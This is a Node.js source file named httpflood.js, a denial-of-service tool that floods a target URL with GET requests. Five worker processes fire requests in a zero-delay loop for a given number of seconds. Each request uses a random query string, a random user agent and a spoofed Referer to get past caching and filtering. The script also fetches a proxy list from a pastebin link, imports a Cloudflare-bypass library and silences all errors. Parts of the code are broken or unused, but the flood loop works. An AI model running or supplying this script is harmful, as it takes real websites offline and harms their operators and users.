const got = require('got');
const url = require('url');
const randomstring = require('randomstring');
const fakeua = require('random-useragent');
const cluster = require('cluster');
const request = require('cloudscraper');
const startstring = url.parse(process.argv[2]).href;

async function main() {

    console.log("[38;2;255;255;51m[[38;2;254;244;57m<[38;2;253;233;63mS[38;2;252;222;69mE[38;2;251;211;75mN[38;2;250;200;81mD[38;2;249;189;87mI[38;2;248;178;93mN[38;2;247;167;99mG[38;2;246;156;105m [38;2;245;145;111mR[38;2;244;134;117mE[38;2;243;123;123mQ[38;2;242;112;129mU[38;2;241;101;135mE[38;2;240;90;141mS[38;2;239;79;147mT[38;2;238;68;153mS[38;2;237;57;159m>[38;2;236;46;165m][0;00m")
    const proxyscrape = await axios.get('https://pastebin.com/raw/UzQezPmS');
    const proxies = proxyscrape.data.replace(/\r/g, '').split('\n');
   }

if (cluster.isMaster){

    if (process.argv.length != 4){

        console.log(`
        Usage : node httpflood.js <url> <time>
        `);
        process.exit(0);
    }
    for (let i = 0; i < 5; i++){
        cluster.fork();
        console.log("Thread",i,"Started");
    }
    console.log("Started Attacking To",startstring);
    setTimeout(() => {

        console.clear();
        console.log("Attacked Stoped");
        process.exit(0);
    },1000*process.argv[3]);
} else {
    run();
}

function randompath(){
    let param = randomstring.generate({
        length: 6,
        charset: 'Https-comet'
    });
    let data = randomstring.generate({
        length: 64,
        charset: 'https-comet'
    });
    let final = `?${param}=${data}`
    return final;
}

function runflood(){
      let target = `${startstring}${randompath()}`
      let useragent = fakeua();
    got.get(target,{
        "headers":{
            "User-agent":useragent,
            "Referer":startstring,
            "Cache-Control": "max-age=5"
        }
    });

}

function run(){

    setInterval(() => {
        runflood();
    },0);
}

process.on('uncaughtException', () => {

});
process.on('unhandledRejection', () => {

});
